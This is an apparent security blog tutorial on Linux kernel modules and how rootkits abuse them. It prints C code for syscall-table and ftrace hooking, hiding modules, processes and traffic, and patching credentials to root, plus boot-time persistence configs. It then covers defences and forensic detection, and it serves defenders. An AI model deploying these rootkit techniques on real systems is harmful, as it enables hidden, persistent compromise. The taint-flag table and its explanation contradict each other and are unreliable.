---
title: "Ring 0 or Die: LKMs, Rootkits,  & Kernel Domination"
date: "2026-03-21"
author: "r4r00t"
topic: "Security"
difficulty: "Advanced"
summary: "How Linux kernel modules are loaded, how kernel rootkits abuse that path, and what defenders can monitor."
---

Linux Loadable Kernel Modules (LKMs) are one of the cleanest extension points in the OS. They let you add kernel functionality without rebuilding or rebooting the kernel.

That same flexibility also makes LKMs a high-value target for attackers: if code lands in kernel space, it can hide, persist, and tamper with almost everything.

---

## Why LKMs Matter

An LKM runs with kernel privileges — Ring 0 on x86. That means:

- **Direct access to kernel memory**: No access control, no bounds checks from userland. The module can read and write any kernel address.
- **Ability to hook kernel behavior**: Syscall tables, function pointers, netfilter hooks — all fair game.
- **Bypass of user-space controls**: SELinux, AppArmor, auditd, and EDR agents often run in user space. A kernel module can silence or lie to all of them.
- **Stable persistence foothold**: A loaded module survives process restarts and can be made to survive reboots with minimal effort.

From an attacker's view, kernel space is the highest-trust code execution environment available on a running system. Everything above it is potentially controllable.

---

## Normal LKM Loading Flow

### Anatomy of a Kernel Module

A kernel module is a standard ELF relocatable object (`.ko`). It exports:

- `module_init()` — called on load
- `module_exit()` — called on unload
- A `MODULE_LICENSE()` macro that controls whether the kernel marks itself "tainted"

A minimal module looks like this:

```c
// hello.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("r4r00t");
MODULE_DESCRIPTION("A minimal LKM example");

static int __init hello_init(void) {
    printk(KERN_INFO "hello: module loaded\n");
    return 0;
}

static void __exit hello_exit(void) {
    printk(KERN_INFO "hello: module unloaded\n");
}

module_init(hello_init);
module_exit(hello_exit);
```

Build it with a Makefile:

```makefile
obj-m += hello.o

KDIR := /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean
```

Then:

```bash
make
sudo insmod hello.ko
dmesg | tail -5
sudo rmmod hello
```

### Loading Paths

Modules reach the kernel through two main paths:

**1. `insmod`** — loads a `.ko` directly, no dependency resolution:

```bash
sudo insmod /path/to/module.ko
```

Internally this calls `finit_module(2)` (or `init_module(2)` for the older interface), which passes the ELF blob to the kernel.

**2. `modprobe`** — dependency-aware loader that reads `/lib/modules/$(uname -r)/modules.dep`:

```bash
sudo modprobe nf_conntrack
```

You can inspect what would be loaded without loading it:

```bash
modprobe --show-depends nf_conntrack
```

**3. Automatic loading** — `udev` rules, `/etc/modules-load.d/`, and kernel uevents can trigger automatic loads based on hardware detection or module aliases.

### Kernel-Side Verification Steps

When the kernel receives a module, it:

1. **Verifies the ELF header** and section structure
2. **Checks the `vermagic` string** — a compile-time fingerprint that must match the running kernel's exact version, SMP config, preemption model, etc.
3. **Validates the module signature** if `CONFIG_MODULE_SIG_FORCE=y` is set (mandatory signing)
4. **Resolves symbol references** against exported kernel symbols
5. **Applies relocations** to fix up addresses
6. **Calls `module_init()`** in the kernel's context

You can inspect a module's metadata before loading:

```bash
modinfo hello.ko
# filename:       hello.ko
# description:    A minimal LKM example
# author:         r4r00t
# license:        GPL
# vermagic:       6.8.0-51-generic SMP preempt mod_unload
# name:           hello
# depends:
```

### Useful Inspection Commands

```bash
# List all currently loaded modules
lsmod

# Get detailed info on a loaded module
modinfo <module_name>

# Check for kernel taint (bit flags)
cat /proc/sys/kernel/tainted
# 0 = clean; non-zero = tainted (see Documentation/admin-guide/tainted-kernels.rst)

# View module parameters
ls /sys/module/<name>/parameters/

# Trace module load events in real time
sudo bpftrace -e 'kprobe:do_init_module { printf("Module loading: %s\n", str(((struct module *)arg0)->name)); }'
```

---

## How Kernel Rootkits Abuse Module Loading

### 1. Syscall Table Hooking

The syscall table (`sys_call_table[]`) is an array of function pointers — one per system call. Historically, modifying it was trivial. Modern kernels make the table read-only, so rootkits use one of two approaches:

**Approach A: Disable write protection temporarily**

```c
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

static unsigned long *syscall_table;
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

// Disable CR0.WP (Write Protect bit) to allow writing to read-only pages
static void disable_wp(void) {
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 & ~0x00010000UL);
}

static void enable_wp(void) {
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 | 0x00010000UL);
}

// Hooked getdents64 — hides files starting with "rootkit_"
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    // ... filter entries starting with "rootkit_" from the result buffer
    return ret;
}

static int __init hook_init(void) {
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!syscall_table) return -ENOENT;

    orig_getdents64 = (void *)syscall_table[__NR_getdents64];

    disable_wp();
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    enable_wp();

    return 0;
}

static void __exit hook_exit(void) {
    disable_wp();
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    enable_wp();
}

module_init(hook_init);
module_exit(hook_exit);
MODULE_LICENSE("GPL");
```

> **Note**: Modern kernels (5.x+) export `kallsyms_lookup_name` only to GPL-licensed modules and may enforce additional protections via `ftrace`. Kernel lockdown mode blocks CR0 manipulation entirely.

**Approach B: ftrace-based hooking (stealthier, more compatible)**

The `ftrace` infrastructure places a `call __fentry__` at the start of (almost) every kernel function. Rootkits can register an ftrace callback to redirect execution:

```c
#include <linux/ftrace.h>
#include <linux/kallsyms.h>

static struct ftrace_ops ops;
static unsigned long orig_do_sys_openat2;

static void notrace ftrace_hook(unsigned long ip, unsigned long parent_ip,
                                struct ftrace_ops *op, struct ftrace_regs *fregs) {
    // Redirect do_sys_openat2 to our handler
    fregs->regs.ip = (unsigned long)hooked_do_sys_openat2;
}

static int __init ftrace_hook_init(void) {
    orig_do_sys_openat2 = kallsyms_lookup_name("do_sys_openat2");

    ops.func    = ftrace_hook;
    ops.flags   = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    ftrace_set_filter_ip(&ops, orig_do_sys_openat2, 0, 0);
    register_ftrace_function(&ops);
    return 0;
}
```

ftrace-based hooks are harder to detect than raw syscall table patches because they use a legitimate kernel facility.

---

### 2. Module Hiding

Once loaded, a rootkit typically removes itself from the module linked list so `lsmod` and `/proc/modules` don't show it:

```c
static struct list_head *prev_module;

static void hide_module(void) {
    // Save the previous list entry so we can restore later
    prev_module = THIS_MODULE->list.prev;
    // Unlink from the module list
    list_del(&THIS_MODULE->list);
    // Also remove from sysfs (hides /sys/module/<name>/)
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

// If you want to be able to unload later, restore the list entry first
static void show_module(void) {
    list_add(&THIS_MODULE->list, prev_module);
}
```

After `hide_module()` runs:

```bash
lsmod | grep rootkit   # nothing
ls /sys/module/        # not there either
cat /proc/modules | grep rootkit  # nothing
```

The module is still loaded and executing — it just no longer appears in any of the standard enumeration paths.

---

### 3. Process Hiding

To hide a process (e.g., PID 1337) from `ps` and `/proc`, the rootkit hooks `getdents64` and filters out the relevant `/proc/1337` directory entry:

```c
// Pseudocode — real implementation needs proper struct traversal
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    int fd = regs->di;
    char __user *dirent = (char __user *)regs->si;
    long ret = orig_getdents64(regs);

    // Get the path associated with fd
    struct fd f = fdget(fd);
    char *path = get_path_from_fd(f);

    if (strcmp(path, "/proc") == 0) {
        // Walk the returned dirent buffer and remove entries matching hidden PIDs
        filter_proc_entries(dirent, ret);
    }

    fdput(f);
    return ret;
}
```

---

### 4. Network Traffic Hiding

Netfilter hooks let a rootkit silently drop or inspect packets:

```c
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define HIDDEN_PORT 4444

static unsigned int hide_traffic_hook(void *priv,
                                      struct sk_buff *skb,
                                      const struct nf_hook_state *state) {
    struct iphdr  *iph;
    struct tcphdr *tcph;

    iph = ip_hdr(skb);
    if (iph->protocol != IPPROTO_TCP)
        return NF_ACCEPT;

    tcph = tcp_hdr(skb);
    // Silently drop packets to/from our C2 port
    if (ntohs(tcph->dest) == HIDDEN_PORT || ntohs(tcph->source) == HIDDEN_PORT)
        return NF_DROP;

    return NF_ACCEPT;
}

static struct nf_hook_ops nf_ops = {
    .hook     = hide_traffic_hook,
    .pf       = PF_INET,
    .hooknum  = NF_INET_PRE_ROUTING,
    .priority = NF_IP_PRI_FIRST,
};

static int __init net_hide_init(void) {
    return nf_register_net_hook(&init_net, &nf_ops);
}
```

This means `ss -tnp`, `netstat`, and most user-space tools won't see connections on port 4444.

---

### 5. Credential Patching (Privilege Escalation)

One of the most impactful rootkit primitives is patching a process's credentials in kernel memory to grant it root:

```c
#include <linux/sched.h>
#include <linux/cred.h>

// Call this from a hooked syscall when triggered by a magic value
void escalate_current(void) {
    struct cred *new_cred = prepare_creds();
    if (!new_cred) return;

    // Set all uid/gid fields to 0 (root)
    new_cred->uid.val  = new_cred->euid.val  = 0;
    new_cred->gid.val  = new_cred->egid.val  = 0;
    new_cred->suid.val = new_cred->sgid.val  = 0;
    new_cred->fsuid.val= new_cred->fsgid.val = 0;

    // Clear capability bounding set restrictions
    cap_clear(new_cred->cap_bset);
    cap_fill(&new_cred->cap_effective);
    cap_fill(&new_cred->cap_permitted);

    commit_creds(new_cred);
}
```

A rootkit can expose this through a backdoor syscall, a magic `ioctl` on a hidden device, or a hooked `write()` that triggers on a specific byte sequence.

---

## Persistence Patterns

### Boot-time Module Loading

```bash
# /etc/modules-load.d/evil.conf
evil_rootkit

# /etc/modprobe.d/evil.conf
# Rename a legitimate module to execute the rootkit instead
install bluetooth /sbin/insmod /lib/modules/$(uname -r)/kernel/evil.ko
```

The second technique is especially sneaky: plugging in a Bluetooth device triggers a normal `bluetooth` module load, which instead loads the rootkit.

### Replacing Kernel Module Files

An attacker with root can overwrite a legitimate `.ko` file:

```bash
# Replace a rarely-used but auto-loaded module
cp evil.ko /lib/modules/$(uname -r)/kernel/drivers/usb/serial/usbserial.ko
# Update dependency metadata
depmod -a
```

On next boot (or next USB serial device insertion), the rootkit loads automatically through normal kernel mechanisms.

### Systemd Service Wrapping

```ini
# /etc/systemd/system/kernel-update.service
[Unit]
Description=Kernel Module Update

[Service]
ExecStart=/bin/bash -c 'insmod /var/lib/.hidden/evil.ko'
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
```

```bash
systemctl enable kernel-update.service
```

---

## Defensive Controls

### Module Signing Enforcement

Compile the kernel with:

```
CONFIG_MODULE_SIG=y
CONFIG_MODULE_SIG_FORCE=y       # Refuse unsigned modules
CONFIG_MODULE_SIG_SHA256=y
```

Check current enforcement status:

```bash
# 0 = disabled, 1 = enabled but not forced, 2 = forced
cat /sys/module/module/parameters/sig_enforce

# Or via boot parameters:
grep -i "module.sig_enforce" /proc/cmdline
```

Signing a module manually:

```bash
# Generate a key pair
openssl req -new -x509 -newkey rsa:2048 -keyout signing_key.pem \
    -out signing_cert.pem -days 365 -subj "/CN=Module Signing/"

# Sign the module
/usr/src/linux-headers-$(uname -r)/scripts/sign-file \
    sha256 signing_key.pem signing_cert.pem hello.ko

# Verify the signature section is present
hexdump -C hello.ko | grep -A2 "~Module signature"
```

With Secure Boot enabled and `CONFIG_MODULE_SIG_FORCE=y`, unsigned modules are rejected before any code runs.

### Kernel Lockdown Mode

Lockdown is a kernel security policy (since 5.4) that restricts potentially dangerous interfaces:

```bash
# Check current lockdown level
cat /sys/kernel/security/lockdown
# [none] integrity confidentiality

# Set at boot via kernel parameter:
# lockdown=confidentiality
```

`integrity` mode blocks:
- Direct `/dev/mem` and `/dev/kmem` access
- Loading unsigned modules
- Hibernation (which can leak key material)

`confidentiality` mode adds:
- No reading kernel memory via any interface
- No BPF JIT debugging

With Secure Boot active, many distros automatically set lockdown to `integrity`.

### Audit Module Load Events

The `init_module` and `finit_module` syscalls are auditable:

```bash
# /etc/audit/rules.d/modules.rules
-a always,exit -F arch=b64 -S init_module,finit_module,delete_module \
    -F key=kernel_modules
```

Then watch for events:

```bash
ausearch -k kernel_modules --interpret | tail -20
```

For real-time detection with eBPF:

```bash
# Trace all module loads with bpftrace
sudo bpftrace -e '
kprobe:do_init_module {
    printf("%-16s %-8d module: %s\n",
        comm, pid,
        str(((struct module *)arg0)->name));
}'
```

### Integrity Monitoring for `/lib/modules`

Use AIDE or a similar file integrity monitor:

```bash
# /etc/aide/aide.conf (relevant excerpt)
/lib/modules    CONTENT_EX    # Monitor content + extended attributes
/boot           CONTENT_EX

# Initialize the database
sudo aide --init
sudo mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz

# Daily check (add to cron or systemd timer)
sudo aide --check
```

For immutable filesystem flags on critical module paths:

```bash
sudo chattr +i /lib/modules/$(uname -r)/kernel/
# Now even root can't modify without removing the immutable flag first
lsattr /lib/modules/$(uname -r)/
```

### Checking Kernel Taint Flags

```bash
cat /proc/sys/kernel/tainted
```

Bit meanings (from `Documentation/admin-guide/tainted-kernels.rst`):

| Bit | Hex    | Meaning                   |
| --- | ------ | ------------------------- |
| 0   | `0x1`  | Proprietary module loaded |
| 1   | `0x2`  | Module force-loaded     |
| 2   | `0x4`  | Out-of-tree module      |
| 4   | `0x10` | Unsigned module         |
| 12  | `0x1000` | Module from staging     |

A taint value of `12` (bits 2+3) indicates an unsigned, out-of-tree module — suspicious in a hardened environment.

Parse it programmatically:

```python
taint = int(open("/proc/sys/kernel/tainted").read())
flags = {
    0:  "Proprietary module",
    1:  "Force-loaded module",
    2:  "Out-of-tree module",
    3:  "Staging driver",
    4:  "Unsigned module",
    9:  "Kernel warned",
    11: "Workaround applied",
}
for bit, label in flags.items():
    if taint & (1 << bit):
        print(f"[!] Taint bit {bit}: {label}")
```

---

## Detection Ideas for Responders

### 1. Baseline and Drift Detection

Capture a clean module list and compare:

```bash
# Snapshot on a known-good system
lsmod | awk '{print $1}' | sort > /var/baseline/modules_baseline.txt

# Periodic comparison
diff /var/baseline/modules_baseline.txt <(lsmod | awk '{print $1}' | sort)
```

### 2. Cross-Verify Module Visibility

A hidden module won't appear in `lsmod` but may still be detectable through other interfaces:

```bash
# /proc/modules is the raw source for lsmod
diff <(lsmod | tail -n +2 | awk '{print $1}' | sort) \
     <(cat /proc/modules | awk '{print $1}' | sort)

# /sys/module/ entries
ls /sys/module/ | sort > /tmp/sysfs_modules.txt
lsmod | awk '{print $1}' | sort > /tmp/lsmod_modules.txt
diff /tmp/lsmod_modules.txt /tmp/sysfs_modules.txt
```

If a rootkit hides from `lsmod` but misses cleaning up `/sys/module/`, this discrepancy will surface it.

### 3. Verify Module File Hashes

```bash
# Generate hashes for all loaded modules' on-disk files
lsmod | tail -n +2 | awk '{print $1}' | while read mod; do
    path=$(modinfo -n "$mod" 2>/dev/null)
    if [ -n "$path" ]; then
        sha256sum "$path"
    fi
done
```

Compare against package manager metadata:

```bash
# Debian/Ubuntu
dpkg --verify linux-modules-$(uname -r)

# RHEL/Fedora
rpm -Va kernel-modules-$(uname -r)
```

### 4. Check for Syscall Table Tampering

Use a tool like `rkcheck` or write a quick one-off with `/proc/kallsyms`:

```bash
# Get expected syscall table address
grep -w "sys_call_table" /proc/kallsyms
# Example: ffffffff82200340 R sys_call_table

# A rootkit that hooks via direct table write leaves the table address unchanged
# but the function pointers inside will point elsewhere
# Use crash/gdb with a kdump to inspect the table entries offline
```

With eBPF, you can monitor for suspicious address ranges:

```bash
sudo bpftrace -e '
kprobe:security_module_request {
    printf("Module request: %s (pid %d, comm %s)\n",
        str(arg0), pid, comm);
}'
```

### 5. Memory Forensics with Volatility

If you suspect live compromise, don't trust the running system:

```bash
# Acquire a memory image (requires a trusted tool, ideally from read-only media)
sudo avml /tmp/memory.lime

# Analyze with Volatility 3 (offline, on a clean system)
python3 vol.py -f memory.lime linux.lsmod  # Lists modules from memory structures
python3 vol.py -f memory.lime linux.hidden_modules  # Cross-checks multiple module lists
python3 vol.py -f memory.lime linux.check_syscall   # Validates syscall table pointers
```

Volatility's `linux.hidden_modules` plugin cross-references four different module list structures. A rootkit that only unlinks from `modules` but misses `kobj_map` or `module_kset` will be caught.

### 6. Correlate Timestamps

```bash
# Find recently modified .ko files — a replacement attack leaves traces
find /lib/modules -name "*.ko" -newer /var/log/dpkg.log -ls

# Correlate module load time against auth and network logs
journalctl -k | grep -E "module (loaded|init)" | head -20
# Then cross-reference with:
last -F | head -20
journalctl -u sshd --since "2026-03-20 00:00" | grep Accepted
```

A module loaded at 03:47 AM two minutes after an SSH login from an unusual IP is a meaningful signal.

---

## Trust Boundary Reminder

Once kernel code is compromised, you cannot trust outputs from the compromised host:

| Tool | Trust level after kernel compromise |
|------|--------------------------------------|
| `lsmod` | Untrusted — filtered by rootkit |
| `ps`, `top` | Untrusted — filtered via `getdents64` hook |
| `ss`, `netstat` | Untrusted — filtered via netfilter or `getdents64` |
| `dmesg` | Partially untrusted — rootkit can suppress kernel log entries |
| `/proc/modules` | Untrusted if module list is unlinked |
| Memory image (offline) | Trusted — rootkit cannot retroactively alter a dump |
| Network capture (external tap) | Trusted — rootkit cannot filter traffic at the wire |

Response plans should include:

1. Isolating the host from the network via external switch or hypervisor controls
2. Taking a memory image with a trusted, read-only tool before shutdown
3. Collecting disk images for offline analysis
4. Not relying on forensic evidence gathered from the live, potentially compromised OS

---

## Final Note

Understanding LKM loading mechanics gives defenders concrete places to add visibility: audit syscalls, sign modules, enforce lockdown, monitor file integrity, and maintain baselines. The attacker techniques above are well-documented and not novel — the goal here is to ensure defenders understand the same surface that attackers do.

Not every kernel module is suspicious. Most are benign drivers and subsystems that make your hardware work. But the most powerful extension points deserve proportionally stronger controls — and the module loading path is as powerful as it gets.

In security, hardening the highest-privilege interfaces first is rarely wasted effort.